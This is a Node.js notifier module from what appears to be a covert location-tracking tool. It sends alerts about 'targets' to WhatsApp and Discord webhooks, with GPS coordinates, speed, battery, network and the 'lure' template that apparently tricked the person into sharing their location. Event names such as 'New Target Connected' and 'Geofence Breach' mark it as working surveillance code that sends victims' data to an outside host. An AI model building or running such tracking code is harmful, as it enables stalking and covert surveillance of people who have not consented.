// Notification Service for WhatsApp & Discord Webhooks
const db = require("./db")

// Throttle map so we don't spam alerts on 4-second intervals
const lastNotified = {}

class Notifier {
    async sendTargetAlert(target, eventType = "update") {
        const settings = db.getSettings()
        const waPhone = settings.whatsappPhone
        const waApiKey = settings.whatsappApiKey
        const waWebhook = settings.whatsappWebhookUrl
        const discordWebhook = settings.discordWebhookUrl

        const hasWhatsApp = (waPhone && waApiKey) || waWebhook
        if (!hasWhatsApp && !discordWebhook) {
            if (eventType === "test") {
                throw new Error("No WhatsApp phone/API key or Discord webhook configured yet.")
            }
            return
        }

        const now = Date.now()
        const lastTime = lastNotified[target.id] || 0
        const isImportant = eventType === "connect" || eventType === "gps_acquired" || eventType === "geofence_breach" || eventType === "test"

        // Rate limit regular position updates to at most once per 60 seconds per target
        if (!isImportant && (now - lastTime) < 60000) {
            return
        }
        if (eventType !== "test") {
            lastNotified[target.id] = now
        }

        const gmapsUrl = `https://www.google.com/maps?q=${target.lat},${target.lng}`
        const timeStr = new Date(target.lastSeen || now).toLocaleTimeString()
        const accuracyStr = target.accuracy ? `±${Math.round(target.accuracy)}m` : "Unknown"
        const speedStr = target.speed != null && target.speed > 0 ? `${(target.speed * 3.6).toFixed(1)} km/h` : "Stationary"
        const batteryStr = target.battery != null ? `${Math.round(target.battery)}%${target.charging ? ' ⚡' : ''}` : "N/A"
        const networkStr = target.network || "Unknown"
        const lureStr = target.lure || "Weather"

        let title = "📍 Target Location Update"
        if (eventType === "test") title = "🧪 TEST ALERT - Live Location Tracker"
        else if (eventType === "connect") title = "🚀 New Target Connected!"
        else if (eventType === "gps_acquired") title = "🎯 Precise GPS Acquired!"
        else if (eventType === "geofence_breach") title = "⚠️ GEOFENCE BREACH DETECTED!"

        // 1. Send WhatsApp Notification
        if (hasWhatsApp) {
            const waMessage = `*${title}*\n\n` +
                `👤 *Target ID:* ${target.id}\n` +
                `🎭 *Lure:* ${lureStr}\n` +
                `📡 *Signal:* ${target.type || 'GPS'} (${accuracyStr})\n` +
                `🏎️ *Speed:* ${speedStr}\n` +
                `🔋 *Battery:* ${batteryStr} | 📶 *Net:* ${networkStr}\n` +
                `🕒 *Time:* ${timeStr}\n\n` +
                `🗺️ *Google Maps:* \n${gmapsUrl}`

            // A) Send via CallMeBot WhatsApp API
            if (waPhone && waApiKey) {
                const cleanPhone = waPhone.replace(/[^0-9]/g, "")
                const encodedText = encodeURIComponent(waMessage)
                const url = `https://api.callmebot.com/whatsapp.php?phone=${cleanPhone}&text=${encodedText}&apikey=${encodeURIComponent(waApiKey)}`

                try {
                    const res = await fetch(url)
                    const body = await res.text()

                    if (body.includes("APIKey is invalid") || body.includes("invalid apikey")) {
                        const errMsg = "CallMeBot API Key is invalid! Please get your actual numeric key from CallMeBot on WhatsApp."
                        console.warn("[WhatsApp CallMeBot Notice]:", errMsg)
                        if (eventType === "test") throw new Error(errMsg)
                    } else if (body.includes("not registered") || body.includes("Please create a new one") || body.includes("not allowed")) {
                        const errMsg = "Phone number not registered! Please send 'I allow callmebot to send me messages' to +34 941 87 53 10 on WhatsApp first."
                        console.warn("[WhatsApp CallMeBot Notice]:", errMsg)
                        if (eventType === "test") throw new Error(errMsg)
                    } else {
                        console.log(`[WhatsApp Alert Sent] Successfully dispatched to +${cleanPhone}`)
                    }
                } catch (err) {
                    console.warn("[WhatsApp Notifier Error]:", err.message)
                    if (eventType === "test") throw err
                }
            }

            // B) Send via Custom WhatsApp Webhook / Gateway
            if (waWebhook && waWebhook.startsWith("http")) {
                try {
                    await fetch(waWebhook, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            phone: waPhone || "",
                            message: waMessage,
                            target,
                            gmapsUrl,
                            eventType
                        })
                    })
                } catch (err) {
                    console.warn("[WhatsApp Webhook Error]:", err.message)
                    if (eventType === "test") throw err
                }
            }
        }

        // 2. Send Discord Webhook Notification
        if (discordWebhook && discordWebhook.startsWith("http")) {
            const embedColor = eventType === "geofence_breach" ? 0xef4444 : (eventType === "connect" ? 0x22c55e : 0x0284c7)
            const discordPayload = {
                username: "Live Location Tracker",
                avatar_url: "https://img.icons8.com/color/96/whatsapp--v1.png",
                embeds: [
                    {
                        title,
                        url: gmapsUrl,
                        color: embedColor,
                        fields: [
                            { name: "Target ID", value: `\`${target.id}\``, inline: true },
                            { name: "Template", value: lureStr, inline: true },
                            { name: "Coordinates", value: `${target.lat.toFixed(5)}, ${target.lng.toFixed(5)}`, inline: true },
                            { name: "Accuracy", value: accuracyStr, inline: true },
                            { name: "Speed", value: speedStr, inline: true },
                            { name: "Battery", value: batteryStr, inline: true },
                            { name: "Network", value: networkStr, inline: true },
                            { name: "Type", value: target.type || "GPS", inline: true },
                            { name: "Google Maps", value: `[View on Map](${gmapsUrl})`, inline: false }
                        ],
                        footer: { text: `Tracker Alert • ${timeStr}` }
                    }
                ]
            }

            try {
                await fetch(discordWebhook, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(discordPayload)
                })
            } catch (err) {
                console.warn("[Discord Notifier Error]:", err.message)
                if (eventType === "test") throw err
            }
        }
    }
}

module.exports = new Notifier()
